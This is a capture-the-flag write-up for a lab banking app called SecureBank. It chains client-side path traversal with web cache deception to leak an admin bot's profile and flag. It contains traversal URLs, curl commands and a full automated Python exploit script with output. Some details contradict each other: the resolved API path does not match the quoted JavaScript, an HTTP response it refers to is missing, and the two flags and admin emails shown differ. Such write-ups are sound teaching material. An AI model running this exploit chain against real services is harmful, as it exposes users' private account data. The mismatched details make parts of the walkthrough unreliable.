# SecureBank Challenge Writeup: Cache Deception + CSPT Account Takeover

## Introduction

While exploring the SecureBank online banking application, there is two seemingly unexploitable vulnerabilities. Individually, these issues had no real impact - but when chained together, you will be able to achieve complete account takeover of the bank administrator and retrieve the flag.

This writeup demonstrates how combining a Client-Side Path Traversal (CSPT) and a Cache Deception vulnerability can turn two gadgets into a critical security issue.

## Initial Reconnaissance

After registering an account on the portal, I was redirected to my account dashboard. The application appeared to be a standard interface with account information.

While exploring the application, I noticed a "Report Suspicious Activity to Bank Security" button - suggesting that bank administrators actively review reported URLs, similar to XSS bot scenarios in many web applications.

## Finding #1: Cache Deception

During my initial reconnaissance, I intercepted the authenticated API request that loads user profile data:

```http
GET /api/profile/a1b2c3d4 HTTP/1.1
Host: localhost:1337
X-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
Accept-Encoding: gzip, deflate, br

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache-Status: MISS

{"user_id":"a1b2c3d4","username":"attacker","email":"attacker@evil.com","flag":""}
```

The endpoint returns sensitive user data. I noticed the `Cache-Control` header was properly set to prevent caching, and the `X-Cache-Status: MISS` indicated the response wasn't cached.

However, I decided to test if the application was vulnerable to **Cache Deception** by adding a `.css` extension to the URL:


Interesting! The response was identical, but now:
- The `Cache-Control` header changed to `max-age=86400, public`
- The response is being cached by the reverse proxy


we can see `X-Cache-Status: HIT` - the cached response is being served

### The Problem

This confirmed a classic **Cache Deception vulnerability**: the CDN/reverse proxy caches responses based solely on URL patterns (files ending in `.css`, `.js`, etc.) without considering:
- The actual content type
- Backend cache control headers  
- Authentication requirements

However, this vulnerability appeared **unexploitable on its own**. Why?

**Browsers cannot automatically send custom headers like `X-Auth-Token` when users click on a link.** If I sent a victim the URL `http://localhost:1337/api/profile/victim_id.css`, their browser would visit it without authentication, receive a 401 error, and nothing would be cached.

I needed a way to force the victim's browser to make an **authenticated request** to this cacheable endpoint.

## Finding #2: Client-Side Path Traversal (CSPT)

While reviewing the profile page source code (View Source → `profile.html`), I discovered vulnerable JavaScript code:

```javascript
async function loadUserProfile() {
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('userId');
    
    if (!userId) {
        showError('No account ID provided');
        return;
    }
    
    const apiUrl = `http://${window.location.host}/api/profile/${userId}`;
    
    try {
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'X-Auth-Token': authToken,  
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br'
            }
        });
        
        const data = await response.json();
        displayUserData(data);
    } catch (err) {
        showError('Failed to load account data');
    }
}
```

This is a classic example of **Client-Side Path Traversal (CSPT)**:
- The `userId` parameter from the URL is directly embedded into the API path
- No validation or sanitization is performed
- The request includes the user's authentication token from localStorage

### Testing the CSPT

I tested this by visiting:
```
http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4
```

The JavaScript would construct:
```
http://localhost:1337/api/users/info/../../api/profile/a1b2c3d4
```

Which the browser normalizes to:
```
http://localhost:1337/api/profile/a1b2c3d4
```

The request succeeded, and the API returned my profile data! I could control the path of an **authenticated API request**.


## The Chain: Combining Both Vulnerabilities

Then it hit me: **What if I combined both findings?**

The CSPT vulnerability allows me to:
- Control the path of an authenticated API request  
- Include the `X-Auth-Token` header automatically

The Cache Deception vulnerability requires:
- An authenticated request with `X-Auth-Token` header  
- A URL ending in `.css` (or similar static extension)

**What if I used the CSPT to make an authenticated request directly to the cacheable endpoint?**

### Crafting the Exploit

I crafted a malicious URL combining path traversal with the cacheable `.css` extension:

```
http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4.css
```

When a victim visits this URL, the vulnerable JavaScript constructs:

```
http://localhost:1337/api/users/info/../../api/profile/a1b2c3d4.css
```

Which resolves to:

```
http://localhost:1337/api/profile/a1b2c3d4.css
```

**The key insight:** This request includes the **victim's `X-Auth-Token` header** (from their localStorage), so when the CSPT triggers, it sends an **authenticated request to the cacheable endpoint**.

The API returns the victim's sensitive profile data, and the CDN caches the response at `/api/profile/a1b2c3d4.css`.

Now, when anyone (including unauthenticated attackers) visits `http://localhost:1337/api/profile/a1b2c3d4.css`, the CDN serves the **victim's cached sensitive data**, including their flag (if they're an admin)!

## Exploitation Steps

### Step 1: Create an Attacker Account

```bash
# Register a new account
curl -X POST http://localhost:1337/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker123","email":"attacker@evil.com","password":"password123"}'
```

Response:
```json
{
  "success": true,
  "auth_token": "eyJhbGc...",
  "username": "attacker123"
}
```

### Step 2: Extract User ID from JWT

```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
payload = jwt.decode(token, options={"verify_signature": False})
print(payload["user_id"])  
```

### Step 3: Craft the Malicious URL

```
http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4e5f6.css
```

This URL will:
1. Load the profile page
2. The JavaScript extracts `userId=../../api/profile/a1b2c3d4e5f6.css`
3. Constructs API call to `/api/users/info/../../api/profile/a1b2c3d4e5f6.css`
4. Normalizes to `/api/profile/a1b2c3d4e5f6.css`
5. Makes authenticated request with victim's token
6. Response gets cached by CDN

### Step 4: Social Engineering - Report to Admin

The application has a "Report Suspicious Activity to Bank Security" feature. I logged into my attacker account, visited my malicious URL, and clicked the report button.

Behind the scenes, a bank administrator (simulated by a headless browser bot) visits the reported URL with their authenticated session. The CSPT triggers, making an authenticated request to:

```
GET /api/profile/a1b2c3d4e5f6.css
X-Auth-Token: <ADMIN_TOKEN>
```

The response contains the **admin's profile data** and gets cached!

### Step 5: Access the Cached Data

Now, as an unauthenticated attacker, I can simply visit:

```bash
curl http://localhost:1337/api/profile/a1b2c3d4e5f6.css
```

Response (cached, no authentication needed):
```json
{
  "user_id": "admin_id_xyz",
  "username": "Administrator",
  "email": "admin@securebank.com",
  "flag": "flag{cache_deception_cspt_chain}"
}
```

**Account Takeover achieved!** The admin's flag is exposed.

## Automated Exploit Script

Here's the complete Python exploit:

```python
import requests
import jwt
import uuid

base_url = "http://localhost:1337"

# Step 1: Register new attacker account
username = "attacker_" + str(uuid.uuid4())[:8]
email = f"{username}@evil.com"
password = "password123"

register_data = {"username": username, "email": email, "password": password}
response = requests.post(f"{base_url}/api/register", json=register_data)
auth_token = response.json()["auth_token"]
print(f"[+] Registered as: {username}")

# Step 2: Extract user_id from JWT
payload = jwt.decode(auth_token, options={"verify_signature": False})
user_id = payload["user_id"]
print(f"[+] User ID: {user_id}")

# Step 3: Craft malicious URL with CSPT + Cache Deception
malicious_url = f"{base_url}/profile?userId=../../api/profile/{user_id}.css"
print(f"[+] Malicious URL: {malicious_url}")

# Step 4: Report URL to trigger admin bot visit
headers = {"X-Auth-Token": auth_token}
report_data = {"url": malicious_url}
response = requests.post(f"{base_url}/api/report", json=report_data, headers=headers)
print(f"[+] Reported to admin: {response.json()['message']}")

# Step 5: Access cached endpoint (no authentication needed!)
import time
time.sleep(3)  # Wait for admin bot to visit

response = requests.get(f"{base_url}/api/profile/{user_id}.css")
data = response.json()

print(f"\n[+] Successfully accessed cached admin data!")
print(f"[+] Admin Username: {data.get('username')}")
print(f"[+] Admin Email: {data.get('email')}")
print(f"[+] flag: {data.get('flag')}")
```

Output:
```
{'email': 'admin@example.com', 'flag': 'flag{cache_deception_with_cspt_gadget_thats_absolute_cinema}', 'user_id': '707f09fc9547f88b', 'username': 'Administrator'}
```
